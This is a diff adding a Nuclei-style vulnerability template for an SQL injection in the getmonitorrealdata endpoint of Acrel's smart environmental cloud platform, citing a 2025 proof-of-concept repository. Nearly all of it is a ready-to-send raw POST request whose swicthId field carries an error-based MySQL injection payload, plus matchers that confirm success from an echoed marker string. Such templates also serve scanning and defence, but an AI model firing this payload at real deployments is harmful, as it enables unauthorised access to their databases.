@@ -1,0 +1,47 @@
+id: acrel-getmonitorrealdata-sqli
+info:
+  name: 安科瑞智能环保云平台getmonitorrealdata SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/%E5%AE%89%E7%A7%91%E7%91%9E/%E5%AE%89%E7%A7%91%E7%91%9E%E6%99%BA%E8%83%BD%E7%8E%AF%E4%BF%9D%E4%BA%91%E5%B9%B3%E5%8F%B0getmonitorrealdata%20SQL%E6%B3%A8%E5%85%A5.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: acrel,sqli
+
+http:
+  - raw:
+      - |
+        POST /Swicth/getmonitorrealdata HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: keep-alive
+        Content-Length: 259
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: ASP.NET_SessionId=tpxci2nbjxx10ydcjnbyku5m
+        Priority: u=0, i
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+
+        {
+        "dnjcsStartTime": "2025-06-30 09:27:00",
+        "dnjcEndTime": "2025-06-30 23:59:59",
+        "swicthId": "-7756' OR 1 GROUP BY CONCAT(0x716a787671,(SELECT (CASE WHEN (1241=1241) THEN 1 ELSE 0 END)),0x716a787671,FLOOR(RAND(0)*2)) HAVING MIN(0)#",
+        "meterId": "1"
+        }
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'qjxvq1qjxvq1')
+        condition: and
